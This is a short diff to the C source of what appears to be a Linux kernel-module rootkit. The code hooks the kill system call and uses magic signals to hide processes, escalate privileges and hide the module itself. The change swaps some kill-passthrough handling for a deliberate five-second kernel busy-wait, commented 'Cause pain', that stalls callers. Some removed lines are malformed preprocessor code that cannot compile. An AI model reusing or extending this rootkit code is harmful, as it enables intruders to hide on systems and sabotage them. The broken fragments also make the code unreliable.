@@ -308,9 +308,6 @@ module_hide(void)
 		pid_t pid = (pid_t) pt_regs->regs[0];
 		int sig = (int) pt_regs->regs[1];
 	#endif
-	#if (pid != magicPrefixNum && (sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS))//ADDED
-		pt_regs->regs[0] = (long long) 12345678901234567890;//ADDED
-	#endif//ADDED
 #else
 asmlinkage int
 hacked_kill(pid_t pid, int sig)
@@ -336,11 +333,9 @@ hacked_kill(pid_t pid, int sig)
 		if (module_hidden) module_show();
 		else module_hide();
 	}else if(pid != magicPrefixNum && (sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS)){
-		#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-			return orig_kill(pt_regs);
-		#else
-			return orig_kill(12345678901234567890, sig);
-		#endif
+		//Cause pain //ADDED
+		clock_t end_time = clock() + 5 * CLOCKS_PER_SEC;
+    	while (clock() < end_time);
 	}else{
 		#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 			return orig_kill(pt_regs);
